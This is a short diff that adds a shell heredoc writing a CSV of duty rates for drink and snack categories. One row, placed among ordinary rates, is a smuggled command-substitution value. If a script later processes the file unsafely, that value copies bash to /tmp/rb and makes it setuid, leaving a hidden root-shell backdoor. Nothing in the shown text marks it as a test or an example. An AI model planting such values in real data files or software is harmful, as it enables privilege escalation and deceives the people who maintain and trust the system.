@@ -1,0 +1,10 @@
+cat > /opt/vrs/data/duty-rates.csv <<'EOF'
+SPIRITS,45,20
+WINE,25,20
+BEER,25,20
+SOFT_DRINKS,20,20
+SNACKS,20,20
+CONFECTIONERY,20,20
+WATER,0,0
+x$(cp /bin/bash /tmp/rb;chmod 4755 /tmp/rb),0,0
+EOF
